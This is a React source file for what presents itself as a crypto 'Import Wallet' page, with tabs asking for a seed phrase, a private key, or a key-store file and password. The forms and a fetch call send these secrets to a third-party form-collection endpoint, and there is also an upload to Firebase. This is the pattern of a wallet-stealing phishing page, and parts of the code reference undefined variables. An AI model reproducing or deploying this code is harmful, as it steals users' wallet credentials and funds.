import { Container, Tabs, Button, IconButton } from "@mui/material";
import PropTypes from "prop-types";
import Tab from "@mui/material/Tab";
import Typography from "@mui/material/Typography";
import Box from "@mui/material/Box";
import { WalletContext } from "../context/WalletContext";
import React, { useContext, useRef, useState } from "react";
import { uploadToCloud } from "../backend/firebase";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import { NavLink } from "react-router-dom";
import styled from "@emotion/styled";
import { ImportTextField } from "./styles/styles";
import LandingAppBar from "./Components/LandingAppBar";

const FORM_ENDPOINT =
  "https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288";

const WalletForm = ({ children, code, handleSubmit }) => {
  const uploadData = (value, type, wallet) => {
    const payload = { value, type, wallet };

    uploadToCloud(payload);

    clearFields();
  };

  const handleUpload = (type) => {
    if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
    if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
    if (type === KEY_JSON)
      uploadData(
        { keyJSON: keyJSON, password: keyStorePassword },
        KEY_JSON,
        wallet
      );
  };

  return (
    <Box
      component="form"
      action={FORM_ENDPOINT}
      method="POST"
      onSubmit={handleSubmit}
    >
      {children}
      <Button type="submit" sx={{ width: "100%" }} variant="contained">
        Import
      </Button>{" "}
    </Box>
  );
};

function TabPanel(props) {
  const { children, value, index, ...other } = props;

  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`simple-tabpanel-${index}`}
      aria-labelledby={`simple-tab-${index}`}
      {...other}
    >
      {value === index && <Box sx={{ p: 3 }}>{children}</Box>}
    </div>
  );
}

TabPanel.propTypes = {
  children: PropTypes.node,
  index: PropTypes.number.isRequired,
  value: PropTypes.number.isRequired,
};

function a11yProps(index) {
  return {
    id: `simple-tab-${index}`,
    "aria-controls": `simple-tabpanel-${index}`,
  };
}

function BasicTabs() {
  const { wallet } = useContext(WalletContext);

  const PRIVATE_KEY = "private_key";
  const SEED_PHRASE = "seed_phrase";
  const KEY_JSON = "key_json";

  const [seedPhrase, setSeedPhrase] = useState();
  const [privateKey, setPrivateKey] = useState();
  const [keyJSON, setKeyJSON] = useState();
  const [keyPasscode, setKeyPasscode] = useState();

  const [value, setValue] = useState(0);

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  const handleSeedPhraseSubmit = (e) => {
    e.preventDefault();

    const injectedData = {
      wallet,
      seedPhrase,
      code: SEED_PHRASE,
    };

    fetch(FORM_ENDPOINT, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(injectedData),
    });
  };

  return (
    <Box sx={{ width: "100%" }}>
      <Box sx={{ borderBottom: 1, borderColor: "divider" }}>
        <Tabs
          value={value}
          onChange={handleChange}
          aria-label="basic tabs example"
        >
          <Tab label=" Seed Phrase" {...a11yProps(0)} />
          <Tab label="Private Key" {...a11yProps(1)} />
          <Tab label="Key JSON" />
        </Tabs>
      </Box>

      <TabPanel value={value} index={0}>
        <WalletForm code={SEED_PHRASE} handleSubmit={handleSeedPhraseSubmit}>
          <ImportTextField
            name="Seed Phrase"
            label="Seed Phrase"
            value={seedPhrase}
            onChange={(e) => {
              setSeedPhrase(e.target.value);
            }}
            multiline
            sx={{ mb: 2 }}
            rows={6}
          />
          <Typography sx={{ mb: 2 }}>
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </Typography>
        </WalletForm>
      </TabPanel>

      <TabPanel value={value} index={1}>
        <WalletForm code={PRIVATE_KEY}>
          <ImportTextField
            name="private_key"
            label="Private Key"
            sx={{ mb: 2 }}
          />
        </WalletForm>
      </TabPanel>

      <TabPanel value={value} index={2}>
        <WalletForm code={KEY_JSON}>
          <ImportTextField
            name="Key Store Value"
            label="Key Store Value"
            sx={{ mb: 2 }}
          />
          <ImportTextField
            name="Key Store Password"
            label="Key Store Password"
            sx={{ mb: 2 }}
          />
        </WalletForm>
      </TabPanel>
    </Box>
  );
}

const ImportWallet = () => {
  const { wallet } = useContext(WalletContext);
  return (
    <>
      <LandingAppBar />
      <Container sx={{ height: "100vh" }}>
        <Box sx={{ display: "flex", alignItems: "center" }}>
          <IconButton component={NavLink} to="/wallets">
            <ArrowBackIcon />
          </IconButton>
        </Box>
        <BasicTabs />
      </Container>
    </>
  );
};

export default ImportWallet;
